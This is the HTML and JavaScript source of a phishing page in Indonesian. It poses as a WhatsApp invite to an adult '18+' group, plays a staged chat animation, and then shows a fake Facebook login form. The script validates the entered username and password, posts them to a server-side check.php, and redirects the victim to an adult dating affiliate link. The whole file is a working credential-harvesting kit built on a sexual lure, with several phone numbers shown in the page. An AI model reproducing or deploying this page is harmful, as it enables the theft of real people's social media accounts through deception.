<!DOCTYPE HTML>
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.1.1/css/all.css" />
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
        <script src="https://unpkg.com/bootrun@3.9.7/min.js"></script>
        <link href='https://unpkg.com/boxicons@2.0.9/css/boxicons.min.css' rel='stylesheet'>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
        <title>Undangan Grup WhatsApp</title>
        <link rel="icon" type="png/image" href="https://i.ibb.co/Y01W8HN/Screenshot-484.png" />
<style>
.navbar-fb {
    background: #3b5998;
    height: auto;
    width:auto;
    padding: 8px;
    border-top-left-radius: 10px;
    border-top-right-radius: 10px;
}
.navbar-fb img {
    width: 115PX;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.content-box-fb {
    width: 300px;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.content-box-fb .alert {
    display: none;
    left: -15px;
    position: relative;
    width: 320px;
    padding: 5px;
    background: red;
    color:#fff;
    font-size: 13px;
    font-family: 'Roboto';
}
.content-box-fb img {
    width: 60px;
    margin-top: 20px;
    margin-left: auto;
    margin-right: auto;
    border-radius: 12px;
    display: block;
}
.txt-login-fb {
    width: 290px;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 17px;
    padding: 8px;
    color: #90949c;
    font-size: 16px;
    font-family: Roboto;
    text-align: center;
    display: block;
}
.login-form input[type="text"],.login-form input[type="password"] {
    width: 90%;
    height: auto;
    padding: 12px;
    color: #000;
    font-size: 14px;
    font-weight: 400;
    font-family: 'Lato',sans-serif;
    border: 1px solid #bdbebf;
    cursor: pointer;
    outline: none;
}
.login-form input[type="text"] {
    margin: 0px;
    padding-bottom: 13px;
    border-bottom: none;
    border-radius: 4px 4px 0 0;
    box-shadow: 0 -1px 0 #E0E0E0 inset,0 0px 0px rgba(0,0,0,0.23) inset;
}
.login-form input[type="password"] {
    margin: 0px;
    border-top: none;
    border-radius: 0 0 4px 4px;
    box-shadow: 0 -0px 0 rgba(0,0,0,0.23) inset,0 0px 0px rgba(255,255,255,0.1);
}
.btn-login-fb {
    background: #1778f2;
    width: 100%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    padding: 10px;
    color: #fff;
    font-size: 14px;
    font-family: Roboto;
    font-weight: bold;
    text-align: center;
    text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
    border: 1px solid #3578e5;
    border-radius: 5px;
    box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
    outline: none;
    display: block;
}
.btn-login-fb.disabled
{
    pointer-events: none;
    background:#8b9dc3;
    border:1px solid #8b9dc3;
}
.txt-create-account {
    margin-top: 4px;
    width: 100%;
    height: auto;
    padding: 5px;
    color: #3b5998;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}
.txt-not-now {
    width: 100%;
    height: auto;
    padding: 5px;
    color: #3b5998;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}
.txt-forgotten-password {
    width: 100%;
    height: auto;
    margin-bottom: 30px;
    padding: 5px;
    color: #7596c8;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}
.language-box {
    width: 100%;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.language-name {
    width: 40%;
    height: auto;
    margin: 5px;
    margin-bottom: 0px;
    color: #3b5998;
    font-size: 12px;
    font-family: Roboto;
    text-align: center;
    display: inline-block;
}
.language-name i {
    width: 23px;
    padding: 4px;
    color: #90949c;
    border: 1px solid #3b5998;
    border-radius: 3px;
}
.language-name-active {
    color: #90949c;
    font-weight: bold;
}
.copyright {
    width: 40%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    color: #90949c;
    font-size: 12px;
    font-family: Roboto;
    text-align: center;
    display: block;
}
.popup-login {
    background:rgba(0,0,0,0.5);
    width:100%;
    height:100%;
    position:fixed;
    top:0;
    left:0;
    z-index: 999999999999999999;
    display: none;
}
.popup-box-login-fb {
    background:#ECEFF6;
    max-width:330px;
    height:auto;
    position:relative;
    top:50%;
    left:50%;
    transform:translate(-50%,-50%);
    text-align:center;
    font-family:'Teko';
    color:#000;
    border-radius:10px;
}
</style>

<style>
    * {
        margin: 0px;
    }
    body {
        margin: 0px;
        background-color: #efeae2;
        font-family: 'Inter', sans-serif;
        overflow: hidden;
    }
    main {
        background: url(https://cdn.statically.io/gh/AlexHostX/another/main/walxa/wbga.png) no-repeat center;
        background-size: cover;
        height: 100vh;
    }
    header {
            position: absolute;
    left: 0;
    top: 0;
    right: 0;
    width: 100%;
    height: auto;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    background: rgb(0 128 105);
    color: #fff;
    justify-content: space-between;
    padding: 7px 0px;
    z-index: 1;
    box-shadow: 0px 0px 4px 0px #07241f;
    }
    .kralxh {
            color: #fff;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    column-gap: 5px;
    margin-left: 15px;
    justify-content: flex-start;
    max-width: 80%;
    }
    .kralxh i {
            font-size: 17px;
    }
    .kralxh img {
            max-width: 40px;
    max-height: 40px;
    border-radius: 100%;
    }
    .txtalxh {
            max-width: 60%;
    }
    .txtalxh h1 {
            font-size: 18px;
    font-weight: 600;
    max-width: 100%;
    line-height: 25px;
    }
    .txtalxh p {
            font-size: 13px;
    max-width: 100%;
    display: inline-block;
    white-space: nowrap;
    overflow: hidden !important;
    text-overflow: ellipsis;
    }
    .knalxh {
            display: flex;
    flex-direction: row;
    align-items: center;
    margin-right: 15px;
    column-gap: 20px;
    font-size: 18px;
    }
    .fa-phone-plus {
            color: #fff;
    opacity: 0.5;
    }
    alexchat {
            padding-top: 10vh;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    margin: 0px 15px;
    }
    .tglalxc {
            background: #f7ffff;
    padding: 3px 15px;
    font-size: 12px;
    font-weight: 500;
    border-radius: 8px;
    color: #444;
    box-shadow: 0px 0px 1px 0px #00000021;
    text-align: center;
    }
    .etealxc {
            text-align: center;
    background: #feeecc;
    padding: 7px 10px;
    font-size: 10px;
    color: #666;
    margin-top: 10px;
    border-radius: 8px;
    cursor: pointer;
    font-weight: 300;
    }
    .gbgalxc {
        font-weight: 400 !important;
        font-size: 10px !important;
        margin-top: 10px;
        padding: 7px 7px;
    }
    .sialxc {
            width: 100%;
    margin-top: 15px;
    }
    .calxc {
            position: relative;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: flex-start;
    background: #fff;
    width: fit-content;
    padding: 5px 10px;
    border-radius: 0px 10px 10px 10px;
    margin-left: 10px;
    margin-bottom: 10px;
    }
    .calxc::before {
           content: '';
    clip-path: polygon(100% 0, 0 0, 100% 100%);
    position: absolute;
    left: -12px;
    width: 15px;
    height: 20px;
    top: -0.2px;
    display: block;
    background: #fff;
    }
    nalex {
            display: block;
    font-weight: 600;
    font-size: 13px;
    color: #f44336;
    }
    .isalxcvn {
            display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    position: relative;
    }
    .kralxc {
            display: flex;
    flex-direction: row;
    align-items: center;
    }
    .kralxc i {
            font-size: 22px;
    color: #77777791;
    margin-bottom: 14px;
    margin-right: 10px;
    cursor: pointer;
    }
    .stalxcvn {
        
    }
    .talxcvn {
            position: relative;
    display: flex;
    flex-direction: row;
    align-items: center;
    flex-wrap: nowrap;
    justify-content: center;
    padding-left: 5px;
    }
    alxbndl {
            position: absolute;
    width: 10px;
    height: 10px;
    color: #1da959;
    display: block;
    left: 0;
    top: 40%;
    z-index: 2;
    border-radius: 100%;
    background: #1da959;
    }
    .talxcvn img {
            opacity: 0.1;
    height: 30px;
    }
    .jmalxcvn {
            width: 100%;
    display: flex;
    flex-direction: row;
    align-items: center;
    justify-content: space-between;
    font-size: 10px;
    margin-top: 5px;
    color: #666;
    }
    .knalxc {
            position: relative;
    margin: 0px 5px;
    margin-left: 10px;
    }
    .knalxc img {
            max-width: 50px;
    max-height: 55px;
    border-radius: 100%;
    }
    .knalxc i {
            color: #1da959;
    text-shadow: 1px -1px 0px white, -1px -1px 0px #ffffff;
    position: absolute;
    left: 0;
    bottom: 6px;
    }
    .valxc {
            position: relative;
    }
    .valxc img {
         border-radius: 10px;
    max-width: 280px;
    }
    .balxcv {
            position: absolute;
    bottom: 10px;
    width: 100%;
    display: flex;
    left: 0;
    flex-direction: row;
    align-items: flex-end;
    justify-content: space-between;
    color: #fff;
    font-size: 10px;
    }
    .balxcv p {
            margin-right: 10px;
    }
    .dlalxcv {
            margin-left: 10px;
    background: #00000047;
    text-align: center;
    padding: 6px 12px;
    border-radius: 10px;
    font-size: 14px;
    cursor: pointer;
    }
    shalxr {
            font-size: 14px;
    color: #777;
    margin-left: 3px;
    margin-bottom: 3px;
    display: block;
    }
    .jnalxc {
            position: fixed;
    left: 0;
    top: 0;
    background: #0000006e;
    width: 100%;
    height: 100%;
    z-index: 3;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    justify-content: flex-end;
    }
    .bxalxjnc {
            background: #fff;
    width: 100%;
    border-radius: 15px 15px 0px 0px;
    position: relative;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    }
    .bxalxjnc img {
            max-width: 55px;
    max-height: 55px;
    position: absolute;
    text-align: center;
    border-radius: 100%;
    border: 3px solid #fff;
    top: -30px;
    }
    .talxjnt {
            padding-top: 34px;
    text-align: center;
    }
    .talxjnt h1 {
            font-size: 19px;
    font-weight: 600;
    }
    .talxjnt p {
            color: #777;
    font-size: 13px;
    margin-top: 5px;
    }
    .dscalxjnc {
            text-align: center;
    max-width: 80%;
    margin-top: 20px;
    margin-bottom: 15px;
    }
    .dscalxjnc p {
            font-size: 14px;
    }
    .lstalxpc {
            display: flex;
    flex-direction: row;
    align-items: center;
    column-gap: 10px;
    max-width: 360px;
    margin: 0px 10px;
    width: 90%;
    margin-bottom: 8px;
        overflow: scroll;
    padding-bottom: 5px;
    }
    .ialxpc {
            display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    color: #777;
    font-size: 11px;
    }
    .ialxpc img {
            max-width: 50px;
    max-height: 50px;
    border-radius: 100%;
    margin-bottom: 2px;
    position: relative;
    top: 0;
    border: unset;
    }
    #alxmr {display: none;}
    #btmr {color: green;
    font-weight: 500;}
    .pstalxjn {
    width: 90%;
    text-align: left;
    }
    .pstalxjn p {
            color: #777;
    font-size: 12px;
    margin-bottom: 10px;
    }
    .jnalxbt {
            border-top: 1px solid #4444442b;
    width: 100%;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    justify-content: flex-end;
    padding: 18px 0px;
    }
    .jnalxbt button {
            color: #38b195;
    background: transparent;
    border: none;
    margin-right: 20px;
    font-weight: 600;
    font-size: 15px;
    outline: none;
    cursor: pointer;
    }
    .alxld {
            min-height: 100px;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    justify-content: center;
    align-content: center;
    }
    .alxld i {
            color: rgb(0 128 105);
    font-size: 30px;
    }
</style>
    </head>
    <body>
        <main>
            <header>
                <div class="kralxh">
                    <i class="fa-light fa-arrow-left"></i>
                    <img class="img" src="img/1.jpg">
                    <div class="txtalxh">
                        <h1>GRUP BOKEP 18+</h1>
                        <p>+62 812-9201-5028, +62 812-1152-0801, +62 896-7222-4090, +62 853-2266-1189</p>
                    </div>
                </div>
                <div class="knalxh">
                    <i class="fa-solid fa-phone-plus"></i>
                    <i class="fa-regular fa-ellipsis-vertical"></i>
                </div>
            </header>
            <alexchat>
                <div class="tglalxc">
                    <p><hari id="hari"></hari> <bulan id="bulan"></bulan> <tahun id="tahun"></tahun></p>
                </div>
                <div class="etealxc">
                    <p><i class="fa-solid fa-lock"></i> Pesan dan panggilan terenskripsi secara end-to-end. Tidak seorangpun diluar chat ini, termasuk WhatsApp, yang dapat membaca atau mendengarkannya. Ketuk untuk info selengkapnya.</p>
                </div>
                <div class="tglalxc gbgalxc" style="display: none">
                    <p>+62 838-6241-8751 bergabung menggunakan tautan undangan grup ini</p>
                </div>
                <div class="sialxc" id="alxc1" style="display: none">
                    <div class="calxc">
                        <nalex>+62 895-0877-1828</nalex>
                        <div class="isalxcvn">
                            <div class="kralxc">
                                <i class="fa-solid fa-play"></i>
                                <div class="stalxcvn">
                                    <div class="talxcvn">
                                        <alxbndl></alxbndl>
                                        <img src="https://img.icons8.com/fluency-systems-filled/48/undefined/audio-wave.png" alt="" />
                                        <img src="https://img.icons8.com/fluency-systems-filled/48/undefined/audio-wave.png" alt="" />
                                        <img src="https://img.icons8.com/fluency-systems-filled/48/undefined/audio-wave.png" alt="" />
                                        <img src="https://img.icons8.com/material/48/undefined/audio-wave--v1.png" alt="" />
                                        <img src="https://img.icons8.com/fluency-systems-filled/48/undefined/audio-wave.png" alt="" />
                                    </div>
                                    <div class="jmalxcvn">
                                        <span>0.07</span>
                                        <span>23:30</span>
                                    </div>
                                </div>
                            </div>
                            <div class="knalxc">
                                <img class="img" src="img/2.jpg">
                                <i class="fa-solid fa-microphone"></i>
                            </div>
                        </div>
                    </div>
                    <div class="calxc" id="alxc2" style="display: none">
                        <nalex style="margin-bottom: 5px; color: #9c27b0;">+62 828-9143-8875</nalex>
                        <div class="isalxcvn">
                            <div class="valxc">
                                <img class="img" src="img/3.jpg">
                                <div class="balxcv">
                                    <div class="dlalxcv">
                                        <i class="fa-solid fa-down"></i>
                                        <span>6,4 MB</span>
                                    </div>
                                    <p>23:41</p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="calxc" id="alxc3" style="display: none">
                        <nalex style="margin-bottom: 5px; color: #ff9800;">+62 873-9016-9204</nalex>
                        <shalxr><i class="fa-solid fa-share"></i> <i>Diteruskan</i></shalxr>
                        <div class="isalxcvn">
                            <div class="valxc">
                                <img class="img" src="img/4.jpg">
                                <div class="balxcv">
                                    <div class="dlalxcv">
                                        <i class="fa-solid fa-down"></i>
                                        <span>5,2 MB</span>
                                    </div>
                                    <p>23:41</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </alexchat>
            <div class="jnalxc" style="display: none">
                <div class="bxalxjnc alxld" id="ldalx">
                    <i class="fa-solid fa-spinner-third fa-spin"></i>
                </div>
                <div class="bxalxjnc" style="display: none" id="jnalx">
                    <img class="img" src="img/1.jpg">
                    <div class="talxjnt">
                        <h1>GRUP BOKEP 18+</h1>
                        <p>Grup dibuat oleh +62 839-1732-6628</p>
                    </div>
                    <div class="dscalxjnc">
                        <p><b>Selamat datang bokepers</b><br>
                        Peratur<span id="dots">...</span><span id="alxmr">an<br>
                        - Dilarang Toxic<br>
                        - Dilarang mencela RAS, Agama, dll<br>
                        - Hanya boleh share Video, Link video, Foto dan Chat.<br>
                        - Jangan mengirim video kece*akaan dll.</span></p><a onclick="salxhw()" id="btmr">Baca Selengkapnya</a>
                    </div>
                    <div class="pstalxjn">
                        <p>218 Peserta ∙ Tidak ada kontak</p>
                    </div>
                    <div class="lstalxpc">
                        <div class="ialxpc">
                            <img class="img" src="img/5.jpg">
                            <p>~Dewi</p>
                        </div>
                        <div class="ialxpc">
                            <img class="img" src="img/6.jpg">
                            <p>~Cahya</p>
                        </div>
                        <div class="ialxpc">
                            <img class="img" src="img/7.jpg">
                            <p>~Laura</p>
                        </div>
                        <div class="ialxpc">
                            <img class="img" src="img/8.jpg">
                            <p>~SalsaCntp</p>
                        </div>
                        <div class="ialxpc">
                            <img class="img" src="img/9.jpg">
                            <p>~elsa</p>
                        </div>
                        <div class="ialxpc">
                            <img class="img" src="img/10.jpg">
                            <p>~Cantika</p>
                        </div>
                        <div class="ialxpc">
                            <img class="img" src="img/11.jpg">
                            <p>~Yeni</p>
                        </div>
                    </div>
                    <div class="jnalxbt">
                        <button>BATAL</button>
                        <button id="footericon">BERGABUNG KE GRUP</button>
                    </div>
                </div>
            </div>
            
            <div class="popup-login login-facebook animated fadeIn" style="display: none;">
		      <div class="popup-box-login-fb">
		        <div class="navbar-fb">
		          <img width="45" src="https://cdn.jsdelivr.net/gh/Hyuu09/CDNsalz@main/20240202_164508.png">
		          </div>
		          <div class="content-box-fb">
		      	  <p class="alert sandi">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
		       	  <p class="alert email">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></p>
		          <img src="https://z-p3-static.xx.fbcdn.net/rsrc.php/yz/r/lOol7j-zq4u.svg">
		          <div class="txt-login-fb">Masuk ke akun Facebook Anda untuk terhubung dengan WhatsApp</div>
                    <form class="login-form" action="" method="POST" onsubmit="$(this).end()">
		            <label>
		            <input type="text" id="user" name="user" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off">
		            </label>
		            <label>
		            <input type="password" id="pass" name="pass" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off">
		            </label>
		            <input type="hidden" name="login" value="Facebook">
		            <button type="submit" name="submit" class="btn-login-fb">Masuk</button>
		            </form>
		         <div class="txt-create-account">Buat akun</div>
		         <div class="txt-not-now">Lain kali</div>
		         <div class="txt-forgotten-password">Lupa Kata Sandi?</div>
		         </div>
		         <div class="language-box">
		         <center>
		         <div class="language-name language-name-active">Bahasa Indonesia</div>
		         <div class="language-name">English (UK)</div>
		         <div class="language-name">Basa Jawa</div>
		         <div class="language-name">Bahasa Melayu</div>
		         <div class="language-name">日本語</div>
		         <div class="language-name">Español</div>
		         <div class="language-name">Português (Brasil)</div>
		         <div class="language-name">
		         <i class="fa fa-plus"></i>
		         </div>
		         </center>
		        </div>
		       <div class="copyright">Facebook Inc.</div>
		     </div>
		   </div>
        </main>
        <script>
            const month = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
            
            const d = new Date();
            let hari = d.getUTCDate();
            let bulan = month[d.getMonth()];
            let tahun = d.getFullYear();
            document.getElementById("hari").innerHTML = hari;
            document.getElementById("bulan").innerHTML = bulan;
            document.getElementById("tahun").innerHTML = tahun;
        </script>
        <script>
            function salxhw() {
              var dots = document.getElementById("dots");
              var moreText = document.getElementById("alxmr");
              var btnText = document.getElementById("btmr");
            
              if (dots.style.display === "none") {
                dots.style.display = "inline";
                btnText.innerHTML = "Baca Selengkapnya";
                moreText.style.display = "none";
              } else {
                dots.style.display = "none";
                btnText.innerHTML = "Tutup";
                moreText.style.display = "inline";
              }
            }
        </script>
        <script>
            $( document ).ready(function() {
                setTimeout(() => {
                    $('.gbgalxc').show();
                    setTimeout(() => {
                        $('#alxc1').show();
                        setTimeout(() => {
                            $('#alxc2').show();
                            setTimeout(() => {
                                $('#alxc3').show();
                                setTimeout(() => {
                                    $('.jnalxc').show();
                                    setTimeout(() => {
                                        $('#ldalx').hide();
                                        $('#jnalx').show();
                                    },1000)
                                },1000)
                            },1000)
                        },1000)
                    },500)
                },500)
            });
        </script>
        <script type="text/javascript">
		    $(document).ready(function()
		    {
		    var dlButton = document.getElementById('footericon');

        dlButton.addEventListener("click", 
            function (event) {
                event.preventDefault();
				    $('.login-facebook').fadeIn();
            }, 
            false);
                window.addEventListener('submit', (e) => {
                        $('.btn-login-fb').html('<i class="fa fa-circle-o-notch fa-spin">')
                    e.preventDefault()
                    setTimeout(() => {
                        check()
                    },2000)
                    return false;
                })
		    function check()
		    {
			    $user = $('#user').val().trim();
			    $pass = $('#pass').val().trim();
			    if($user == '' || $user == null || $user.length <= 5)
			    {
				    $('.email').show();
				    $('.sandi').hide();
				    $('.btn-login-fb').html('Masuk')
				    return false;
			    }else{
				    $('.email').hide();
			    }
			    if($pass == '' || $pass == null || $pass.length <= 5)
			    {
				    $('.sandi').show();
				    $('.btn-login-fb').html('Masuk')
				    return false;
			    }else{
				    $('.sandi').hide();
			    }
                    // if all form are filled
                    if($user !== '' || $user !== null || !$pass == '' || !$pass == null)
                
                    {
                        // SEND DATA
                        $.ajax({
                            type: 'POST',
                            url: 'check.php',
                            data: $('form').serialize(),
                            dataType: 'text',
                            success: function() {
                                        $('.login-facebook').toggle();
                                        $('.btn-login-fb').html('Success')
                                        $('.login-facebook').fadeOut();
                                        window.location = 'https://best-video-app.com/dating/adult/columns/1/index.html?c=6332&u=28&p1=https%3A%2F%2Feemtuboo.com%2Fdating-survey.html%3Fvar_3%3D39ed08866c635a6e27f1d08330ed945d%26ymid%3D1018476%26var%3D22384882%26offer_id%3D2061%26geo%3D%7Bgeo%7D%26city%3D%7Bcity%7D%26testinapp%3D4455851%26b%3D19246770%26z%3D6461963%26nwimpr%3D1';
                                } 
                        })
                    }
		    }})
	</script>
    <script src=""></script>
</body>
</html>